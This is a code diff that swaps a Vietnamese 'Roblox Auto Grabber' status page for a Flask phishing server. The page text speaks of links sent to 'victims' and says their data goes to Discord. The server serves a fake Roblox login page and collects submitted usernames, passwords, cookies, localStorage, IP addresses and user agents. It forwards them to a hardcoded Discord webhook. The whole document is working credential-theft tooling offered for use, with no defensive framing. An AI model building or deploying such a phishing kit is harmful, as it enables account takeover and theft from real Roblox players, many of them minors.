@@ -1,48 +1,61 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Auto Grabber</title>
-    <style>
-        body { background: #0d0d0d; color: #0f0; font-family: 'Segoe UI', Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
-        .container { background: #1a1a1a; padding: 30px; border-radius: 16px; border: 1px solid #0f0; max-width: 600px; width: 100%; text-align: center; }
-        .meme-box { width: 100%; height: 300px; background: #222; border-radius: 12px; overflow: hidden; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
-        .meme-box img { width: 100%; height: 100%; object-fit: cover; }
-        .status { font-size: 24px; margin: 20px 0; color: #0f0; }
-        .link-area { background: #222; padding: 10px; border-radius: 8px; margin: 10px 0; font-size: 14px; word-break: break-all; }
-        .link-area code { color: #0f0; }
-        .footer { margin-top: 20px; font-size: 12px; color: #555; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>🎮 ROBLOX AUTO GRAB</h2>
-        <div class="meme-box" id="memeBox">
-            <img id="memeImage" src="https://i.imgflip.com/1bij.jpg" alt="meme">
-        </div>
-        <div class="status">✅ ĐANG HOẠT ĐỘNG</div>
-        <div class="link-area">
-            Link gửi nạn nhân: <code>/login/roblox</code>
-        </div>
-        <div class="footer">Khi nạn nhân truy cập, thông tin tự động gửi về Discord.</div>
-    </div>
+import os
+import json
+import requests
+from flask import Flask, request, render_template, jsonify
+from datetime import datetime
 
-    <script>
-        const memes = [
-            "https://i.imgflip.com/1bij.jpg",
-            "https://i.imgflip.com/26am.jpg",
-            "https://i.imgflip.com/2k9f.jpg",
-            "https://i.imgflip.com/4t0m5.jpg",
-            "https://i.imgflip.com/5b8y.jpg",
-            "https://i.imgflip.com/7k9c.jpg"
-        ];
-        let memeIndex = 0;
-        const memeImg = document.getElementById('memeImage');
-        setInterval(() => {
-            memeIndex = (memeIndex + 1) % memes.length;
-            memeImg.src = memes[memeIndex];
-        }, 3000);
-    </script>
-</body>
-</html>
+app = Flask(__name__)
+
+# ===== DISCORD WEBHOOK (THAY BẰNG CỦA BẠN) =====
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532377022137892928/DAwlZwsG3ngH2tEL2Oc7XgrXkz0xu8y4kfgzKssdb7UuTS8jVPoWB1MdxFRTT5HIv_RK"
+
+def send_discord(platform, data, ip, user_agent):
+    embed = {
+        "embeds": [{
+            "title": "🎯 ROBLOX AUTO GRAB",
+            "color": 0xff5500,
+            "fields": [
+                {"name": "Email/Username", "value": data.get('email', 'N/A'), "inline": True},
+                {"name": "Password", "value": data.get('password', 'N/A'), "inline": True},
+                {"name": "Cookies", "value": data.get('cookies', 'N/A')[:300] + "...", "inline": False},
+                {"name": "LocalStorage", "value": json.dumps(data.get('localStorage', {}), indent=2)[:300] + "...", "inline": False},
+                {"name": "IP", "value": ip, "inline": True},
+                {"name": "User-Agent", "value": user_agent[:100], "inline": False},
+                {"name": "Time", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
+            ],
+            "footer": {"text": "Auto Grabber - Roblox only"}
+        }]
+    }
+    try:
+        r = requests.post(DISCORD_WEBHOOK_URL, json=embed)
+        if r.status_code == 204:
+            print("[+] Webhook sent.")
+        else:
+            print(f"[-] Webhook error: {r.status_code}")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/login/roblox')
+def roblox_login():
+    # Luôn cho phép, không kiểm tra status
+    return render_template('login.html', platform="roblox")
+
+@app.route('/capture', methods=['POST'])
+def capture():
+    data = request.get_json()
+    ip = request.remote_addr
+    ua = request.headers.get('User-Agent', '')
+    send_discord('roblox', data, ip, ua)
+    return jsonify({"status": "ok"})
+
+@app.route('/success')
+def success():
+    return render_template('success.html')
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port, debug=False)
